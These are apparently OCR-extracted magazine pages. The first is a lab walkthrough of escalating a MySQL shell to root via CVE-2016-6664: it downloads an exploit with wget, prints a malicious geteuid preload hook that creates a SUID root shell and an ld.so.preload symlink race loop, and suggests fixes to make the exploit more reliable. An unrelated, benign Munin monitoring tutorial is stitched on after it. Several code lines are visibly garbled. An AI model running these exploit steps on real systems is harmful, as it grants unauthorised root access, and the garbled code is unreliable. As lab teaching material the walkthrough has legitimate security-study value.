  md: '# mysql_suid_shell.MYD-4.2S


    You will be presented with a shell; first of all, you should now check that you
    have obtained a mysql-shell by issuing the whoami command:


    ```

    ```

    mysql_suid_shell.MYD-4.2S whoami

    mysql

    ```

    ```


    From here you can escalate even more privileges by exploiting either CVE-2016-6662
    or CVE-2016-6664. Let''s try the second one. Open a new terminal in your WebDio
    VM and download the second exploit:


    ```

    ```

    wget --no-check-certificate

    https://www.exploit-db.com/download/40679 -O 40679.sh

    ```

    ```


    This time it is a shell script written in Bash. You can set its execution bit
    first:


    ```

    ```

    chmod +x 40679.sh

    ```

    ```


    If you execute the script you will get an error:


    ```

    ```

    ./40679.sh

    : invalid option

    ```

    ```


    Fix it with the dos2unix command:


    ```

    ```

    sudo apt-get install dos2unix

    dos2unix 40679.sh

    ```

    ```


    This new technique can gain root access by means of diverting the MySQL error
    log file to /etc/ld.so.preload, then replacing its contents with a malicious library
    (generated and compiled within the Bash script). This library will then be preloaded
    by the linker, thus replacing the call to geteuid() with this malicious one:


    ```

    ```

    1  int t_geteuid(void) {

    2      static uid_t    (\*old_geteuid)();

    3      old_geteuid = dlsym(RTLD_NEXT, "geteuid");

    4      if ( old_geteuid() == 0 ) {

    5          chown("$BACKDOORPATH",  0, 0);

    6          chmod("$BACKDOORPATH", 04777);

    7      }

    8      return old_geteuid();

    9  }

    ```

    ```


    This will make a copy of $BACKDOORPATH (i.e., /bin/bash) with SUID root privileges.
    For this to work, mysqld_safe must be running. Edit /etc/init/mysqld.conf and
    make sure mysqld_safe is executed instead of mysqld:


    ```

    ```

    exec /usr/bin/mysqld_safe

    ```

    ```


    Finally, edit /etc/mysql/conf.d/mysqld_safe_syslog.conf and set the path for errorlog:


    ```

    ```

    log-error=/var/log/mysql/error.log

    ```

    ```


    Let''s start afresh: stop the service, delete the error log file and finally start
    MySQL again:


    ```

    ```

    service mysqld_stop

    rm -rf /var/log/mysql/error.log

    service mysqld_start

    ```

    ```


    Execute the second exploit from within the MySQL shell:


    ```

    ```

    mysql_suid_shell.MYD-4.2S \40679.sh /var/log/

    mysql>

    ```

    ```


    ```

    ```

    error.log

    [..]

    [r] Waiting for MySQL to re-open the logs/MySQL

    service restart....

    Do you want to kill mysqld process to instantly get

    root? : ? [y/n]

    ```

    ```


    At this point, if you press y and then Enter, the script will perform a killall
    mysqld, thus making mysqld_safe create a new error.log file from scratch. Because
    now /var/log/mysql/error.log points to /etc/ld.so.preload (it is a soft link),
    the error log will be stored in /etc/ld.so.preload (this is known as a symlink
    attack). The exploit iterates until it sees this file, at which point it will
    try to add the malicious library to it (line 4) and then delete the $ERRORLOG
    file (line 5):


    ```

    ```

    1  while ; do

    2      sleep 0.1

    3      if [ -f /etc/ld.so.preload ]; then

    4          echo $PRIVESCLIB > /etc/ld.so.preload

    5          rm -f $ERRORLOG

    6      break;

    7  fi

    8  done

    ```

    ```


    Depending on how fast your VM is, you may or may be not successful in executing
    this exploit out-of-the- box. The worst-case scenario is the file is temporarily
    owned by root until mysqld_safe execute chown() (thus changing the ownership of
    /etc/ld.so.preload to mysql). If the exploit tries to overwrite /etc/ld.so.preload
    it will fail (the exploit is run as mysqld). The exploit will continue its execution
    until its very last line. What we will have by then would be a few MySQL error
    log entries in /etc/ld.so.preload, and because this file is system-wide, every
    single binary that we try to execute afterwards will complain about not being
    able to pre-load a bunch of unknown objects. If a privileged user reboots the
    computer, a total system crash could happen. One way to fix this is by increasing
    the sleep parameter or by making sure the file has been successfully overwritten
    before breaking the loop and deleting $ERRORLOG (lines 5-7):


    ```

    ```

    1  echo $PRIVESCLIB > /etc/ld.so.preload

    5  if [ $? -eq 0 ]; then

    6      rm -f $ERRORLOG

    7  break;

    8  fi

    ```

    ```'
  merge: -1
  img_proc: true
- pgno: 41
  md: '# Monitor your network with Munin


    Learn how to install and configure Munin on a Linux system to monitor network
    computers


    ![](img/1f330653f83dcf0397f7d224ce8bbc16_41_0.png)


    **Nithish Tiwari** is a software developer by profession, with a huge interest
    in Free and Open Source software. As well as serving as a community moderator
    and author for leading FOSS publications, he also helps organisations adopt open
    source software for their business needs.


    A computer network is not complete without a resource-monitoring component. While
    there is no dearth of such monitoring tools, a tried and tested tool is always
    better than relatively new tools – especially when it comes to network uptime
    and reliability. In this tutorial we will take a look at one such reliable networked
    resource monitoring tool called Munin. It lets you easily monitor the performance
    of not only your computers, but networks, SANs, applications, and various other
    resources.


    Written in Perl, Munin is easily extensible and its plugins can be written in
    any language. You can extend the functionality to monitor specific resources via
    Munin plugins. Architecturally, Munin has a master/node design where the master
    connects to all the nodes at regular intervals and asks them for data. The master
    keeps track of the incoming data and any changes therein and serves this information
    to the end user via a web-based interface.


    Munin is available for almost all the major Linux distributions, including Debian,
    Ubuntu, Fedora and Red Hat among others. In this tutorial, we''ll see how to install
    and get started with Munin, followed by how to configure it in a network. We''ll
    also take a look at some of the interesting Munin plugins and see how to write
    your own Munin plugins.


    # Resources


    Munin

    http://munin-monitoring.org/


    ![](img/1f330653f83dcf0397f7d224ce8bbc16_41_1.png)


    Similarly, you can install the munin-node package by typing:


    ```

    $ sudo apt-get install munin-node

    ```


    # 01  Install Munin


    As Munin is based on a master/node architecture, you''ll need to choose the software
    package to be installed based on the role the machine is going to play. For example,
    if a machine is going to serve as the master, you need to install the **munin-master**
    package on that machine. By master, we mean the machine that is going to collect
    data from all nodes, and serve the results to the end users. The **munin-master**
    runs **munin-httd**, a basic web server that provides the munin web interface
    on port 4040/tcp. If you''re just starting with Munin or have just a few nodes
    in your network, it should be enough to install the **munin-master** on one machine.
    On all the other machines in the network (that are going to be monitored), you
    need to install the **munin-node** package. We have taken Ubuntu 16.04 as the
    host system for this tutorial.


    To install the munin-master package, type the following:


    ```

    $ sudo apt-get install munin

    ```


    ![](img/1f330653f83dcf0397f7d224ce8bbc16_41_2.png)


    Right The Munin monitoring home page on a Munin master system. The top-left corner
    shows the possible problems in different categories


    ![](img/1f330653f83dcf0397f7d224ce8bbc16_41_3.png)


    # 02  Munin master configuration


    Once you have both the master and node packages installed on the relevant machines,
    you''ll need to configure them so that they can talk to each other. Additionally,
    Munin master needs to have the web server configured to be able to serve network
    status via webpages. All the configuration files are present in the folder /etc/munin.


    Let''s first configure Munin master. To start with, open the configuration file
    like this:


    ```

    $ cd /etc/munin/

    $ sudo nano munin.conf

    ```


    Then look for the lines starting with **dbdir**. This section defines the directories
    that store various Munin master files. The **dbdir** stores all of the **rrdfiles**
    containing the actual monitoring information, **htmlDir** stores the images and
    site files, **logDir** maintains the **logs**, **rundir** holds the state files,
    and **tmpDir** is the location for the HTML templates.'
  merge: -1
  img_proc: true
